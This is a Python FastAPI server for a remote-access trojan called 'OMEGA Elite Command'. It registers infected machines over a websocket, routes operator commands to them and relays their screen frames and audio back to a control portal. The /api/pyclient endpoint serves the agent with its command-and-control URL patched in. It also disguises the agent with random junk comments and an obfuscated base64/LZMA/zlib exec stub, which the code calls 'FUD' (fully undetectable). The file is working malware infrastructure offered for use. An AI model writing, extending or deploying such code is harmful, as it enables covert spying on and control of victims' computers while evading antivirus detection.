import os, sys, asyncio, orjson, uuid, base64, random, string
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Response
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# ── OMEGA Core Modules ─────────────────────────────────────────────────────────
from core.database import Database
from core.broker import ConnectionManager, CLIENTS, PORTALS, PORTAL_TO_CLIENT

# ── App & Module Instances ─────────────────────────────────────────────────────
app = FastAPI(title="OMEGA Elite Command")
db = Database()
manager = ConnectionManager()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def rv(): return "".join(random.choices(string.ascii_letters, k=8))

# ── WebSocket — Main Brokering Channel ──────────────────────────────────────────
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = None
    client_type = "client"

    try:
        raw = await websocket.receive()
        handshake = orjson.loads(raw.get("text") or raw.get("bytes") or "{}")
        msg_type = handshake.get("type")

        if msg_type == "portal":
            client_type = "portal"
            print("[OMEGA] Portal connected.")
            await manager.connect(websocket, "portal", None)
            # Push initial device list
            devices = db.get_devices()
            active = list(CLIENTS.keys())
            for d in devices:
                # v21.3 Fix: Sync with broker ID logic
                d["status"] = "Active" if d.get("id") in active else "Standby"
            await websocket.send_text(orjson.dumps({"t": "devices", "data": devices}).decode())

        elif msg_type == "client_auth":
            client_id = str(handshake.get("id", "Unknown"))
            specs = handshake.get("specs", {})
            specs["ip"] = websocket.client.host
            db.update_device(client_id, {"hostname": client_id, "status": "Active", "specs": specs})
            print(f"[OMEGA] Node registered: {client_id}")
            await manager.connect(websocket, "client", client_id)
            await websocket.send_text(orjson.dumps({"t": "handshake_ok"}).decode())
            await manager.broadcast_devices(db)

        # Main Loop — with Railway keep-alive ping every 25s
        import time
        _last_ping = time.monotonic()

        while True:
            try:
                raw = await asyncio.wait_for(websocket.receive(), timeout=25.0)
            except asyncio.TimeoutError:
                # Send ping to keep Railway connection alive
                try:
                    await websocket.send_text('{"t":"ping"}')
                except Exception:
                    break
                continue
            text   = raw.get("text")
            binary = raw.get("bytes")

            if text:
                if client_type == "client":
                    # Forward agent text data to all portals
                    await manager.broadcast_text_to_portals(text, client_id)
                else:
                    # Dashboard command routing
                    data = orjson.loads(text)
                    if data.get("type") == "select_device":
                        PORTAL_TO_CLIENT[websocket] = data.get("id")
                    else:
                        target_id = PORTAL_TO_CLIENT.get(websocket)
                        if target_id and target_id in CLIENTS:
                            await CLIENTS[target_id].send_text(text)

            elif binary and client_type == "client":
                # ── Binary relay: screen frames / audio → requesting portal ───
                for portal_ws, selected_cid in list(PORTAL_TO_CLIENT.items()):
                    if selected_cid == client_id:
                        try:
                            await portal_ws.send_bytes(binary)
                        except Exception:
                            pass

    except WebSocketDisconnect:
        manager.disconnect(websocket, db)
    except Exception as e:
        print(f"[OMEGA] WS Error: {e}")
        manager.disconnect(websocket, db)

# ── REST API — Flagship Logic ──────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def get_root():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/api/pyclient")
async def serve_agent(request: Request):
    """Serves the OMEGA agent (omega_core.py) with URL patched + FUD wrapped."""
    host = request.headers.get("host", "localhost:8000")
    f_proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    proto = "https" if f_proto == "https" or "railway.app" in host else "http"
    base_url = f"{proto}://{host}"
    print(f"[OMEGA] Payload requested via: {base_url}")

    agent_path = "omega_core.py"
    if not os.path.exists(agent_path):
        return Response("Agent file not found", status_code=404)

    try:
        with open(agent_path, "r", encoding="utf-8") as f:
            code = f.read()

        # [OMEGA-POLY] Add polymorphic junk code
        junk = f"\n# {rv()} {rv()} {rv()}\n"
        code += junk

        # Patch C2 URL (Patching 'http://localhost:8000' with the real base_url)
        code = code.replace('SERVER_URL = "http://localhost:8000"', f'SERVER_URL = "{base_url}"')

        # FUD: LZMA + zlib + base64 polymorphic wrapper
        import lzma, zlib
        compressed = zlib.compress(lzma.compress(code.encode("utf-8")))
        payload = base64.b64encode(compressed).decode()

        v_b64  = "".join(random.choices(string.ascii_letters, k=8))
        v_lz   = "".join(random.choices(string.ascii_letters, k=8))
        v_zl   = "".join(random.choices(string.ascii_letters, k=8))
        v_pay  = "".join(random.choices(string.ascii_letters, k=8))
        v_dec  = "".join(random.choices(string.ascii_letters, k=8))

        stub = (
            f"import base64 as {v_b64}, lzma as {v_lz}, zlib as {v_zl}\n"
            f"{v_pay}='{payload}'\n"
            f"{v_dec}={v_lz}.decompress({v_zl}.decompress({v_b64}.b64decode({v_pay})))\n"
            f"exec({v_dec}.decode('utf-8'),globals())\n"
        )
        return Response(content=stub, media_type="text/plain")
    except Exception as e:
        return Response(f"Error: {e}", status_code=500)

app.mount("/static", StaticFiles(directory="static"), name="static")

@app.on_event("startup")
async def startup():
    async def janitor():
        while True:
            try:
                db.prune_stale(timeout=3600)
                await manager.broadcast_devices(db)
            except: pass
            await asyncio.sleep(60)
    asyncio.create_task(janitor())
    print("OMEGA ELITE | PRO SPACE GRAY ENGINE ACTIVE.")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
